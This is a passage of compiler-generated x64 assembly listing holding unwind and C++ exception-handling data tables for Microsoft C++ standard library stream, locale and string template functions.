xdata	SEGMENT
$stateUnwindMap$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA
	DB	028H
	DB	030H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z DB 038H
	DD	imagerel $stateUnwindMap$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z
	DD	imagerel $tryMap$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z
	DD	imagerel $ip2state$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z DD 021619H
	DD	0110116H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Pnavail@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEBA_JXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Pninc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEAAPEA_WXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?sputn@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAA_JPEB_W_J@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pubsync@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAHXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z DB 0aH
	DB	00H
	DB	00H
	DB	','
	DB	02H
	DB	'!', 02H
	DB	04H
	DB	'v'
	DB	02H
	DB	'('
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z
	DD	imagerel $ip2state$??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z DD 010911H
	DD	0c209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ DB 060H
	DD	imagerel $ip2state$??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ DD 010919H
	DD	06209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z DB 06H
	DB	00H
	DB	00H
	DB	'<'
	DB	02H
	DB	095H, 02H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z DB 028H
	DD	imagerel $stateUnwindMap$??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z
	DD	imagerel $ip2state$??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z DD 010e11H
	DD	0620eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ DB 060H
	DD	imagerel $ip2state$??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ DD 010919H
	DD	06209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R?$default_delete@V_Facet_base@std@@@std@@QEBAXPEAV_Facet_base@1@@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z DD 010e01H
	DD	0220eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Pocma@V?$allocator@D@std@@@std@@YAXAEAV?$allocator@D@0@0@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_grow_by@V<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@Z DD 021b01H
	DD	011011bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_e1befb086ad3257e3f042a63030725f7>@@QEBA@QEADQEBD_K2D@Z DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_grow_by@V<lambda_b986da8d428e4af07c64af60eec09b61>@@_K_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_b986da8d428e4af07c64af60eec09b61>@@_K2D@Z DD 021b01H
	DD	013011bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_b986da8d428e4af07c64af60eec09b61>@@QEBA@QEADQEBD_K22D@Z DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DB 060H
	DD	imagerel $ip2state$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD 010e19H
	DD	0420eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z DD 010e01H
	DD	0220eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBA_JXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z DD 010d01H
	DD	0820dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_grow_by@V<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@Z DD 021b01H
	DD	011011bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_65e615be2a453ca0576c979606f46740>@@QEBA@QEADQEBD_K12@Z DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_grow_by@V<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@Z DD 021b01H
	DD	011011bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_319d5e083f45f90dcdce5dce53cbb275>@@QEBA@QEADQEBD_KD@Z DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_G?$numpunct@D@std@@MEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$numpunct@D@std@@AEAAXXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_truename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_falsename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_grouping@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	022H
	DW	01b7H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z DB 06H
	DB	00H
	DB	00H
	DB	'-', 02H
	DB	02H
	DB	089H, 04H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0??_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z DB 028H
	DD	imagerel $stateUnwindMap$?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z
	DD	imagerel $ip2state$?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z DD 042a19H
	DD	01d0118H
	DD	060107011H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z
	DD	0d2H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$numpunct@D@std@@MEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 0eH
	DB	00H
	DB	00H
	DB	092H
	DB	02H
	DB	'b'
	DB	04H
	DB	'N'
	DB	02H
	DB	012H
	DB	04H
	DB	014H
	DB	06H
	DB	' '
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DB	05eH
	DD	imagerel ?dtor$1@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 028H
	DD	imagerel $stateUnwindMap$?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
	DD	imagerel $ip2state$?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DD 021111H
	DD	0190111H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z DB 06H
	DB	00H
	DB	00H
	DB	'P'
	DB	02H
	DB	'J'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z
	DD	imagerel $ip2state$??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z DD 011811H
	DD	04218H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?truename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?falsename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?grouping@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?thousands_sep@?$numpunct@D@std@@QEBADXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decimal_point@?$numpunct@D@std@@QEBADXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z DB 0aH
	DB	00H
	DB	00H
	DB	','
	DB	02H
	DB	'!', 02H
	DB	04H
	DB	'v'
	DB	02H
	DB	'('
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z
	DD	imagerel $ip2state$??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z DD 010911H
	DD	0c209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Float_put_desired_precision@N@std@@YAH_JH@Z DD 010d01H
	DD	0220dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Float_put_desired_precision@O@std@@YAH_JH@Z DD 010d01H
	DD	0220dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$01PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z DD 011301H
	DD	0c213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$00PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z DD 011301H
	DD	0a213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$0A@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXD_K@Z DD 011201H
	DD	0a212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@D@1@@Z DD 011201H
	DD	04212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 011301H
	DD	0c213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 011301H
	DD	0c213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z DD 011201H
	DD	04212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Pocma@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@0@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Traits_find@U?$char_traits@_W@std@@@std@@YA_KQEB_W_K101@Z DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_one_at_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$emplace_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@QEAA?A_TAEBD@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_one_at_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$emplace_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@QEAA?A_TAEBE@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_one_at_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$emplace_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?A_TAEB_W@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??4?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@D@Z DD 010d01H
	DD	0620dH
xdata	ENDS
